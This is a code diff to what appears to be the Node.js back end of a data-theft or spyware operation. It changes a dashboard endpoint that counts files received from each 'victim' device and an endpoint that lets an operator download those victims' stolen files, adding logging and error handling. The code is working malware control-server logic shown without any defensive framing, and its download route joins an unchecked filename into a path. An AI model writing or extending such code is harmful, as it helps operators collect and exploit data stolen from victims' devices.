@@ -155,35 +155,44 @@ app.post('/upload', (req, res) => {
 
 // Dashboard data endpoint
 app.get('/dashboard-data', (req, res) => {
-    const dashboardData = Object.entries(connectedDevices).map(([victimId, device]) => {
-        // Use the victimFileCounts to get the total number of files for each victim
-        const totalFilesReceived = victimFileCounts[victimId] || 0;  // Default to 0 if no files received
+     const dashboardData = Object.entries(connectedDevices).map(([victimId, device]) => {
+        const totalFilesReceived = device.fileList.length; // Count files received
 
         return {
             ...device,
             totalFiles: totalFilesReceived, // Add the total files field
         };
     });
-    res.json(dashboardData);  // Return the updated data
+    res.json(dashboardData); // Return the updated dashboard data
 });
 
 // File download endpoint
 app.get('/download/:victimId/:filename', (req, res) => {
     try {
         const { victimId, filename } = req.params;
+
+        // Ensure victim folder exists
         if (!victimFolders[victimId]) {
+            console.log(`❌ Victim folder not found for victim ${victimId}`);
             return res.status(404).json({ error: 'Victim folder not found' });
         }
 
-        const filePath = path.join(victimFolders[victimId], filename);
+        const victimFolder = victimFolders[victimId];
+        const filePath = path.join(victimFolder, filename);
+
+        // Check if the file exists
         if (!fs.existsSync(filePath)) {
+            console.log(`❌ File not found at ${filePath}`);
             return res.status(404).json({ error: 'File not found' });
         }
+
+        // Log the file being downloaded
+        console.log(`📥 Downloading file: ${filePath}`);
 
         res.download(filePath, filename, (err) => {
             if (err) {
                 console.error(`❌ Download error:`, err);
-                res.status(500).json({ error: 'Error sending file' });
+                return res.status(500).json({ error: 'Error sending file' });
             }
         });
     } catch (error) {
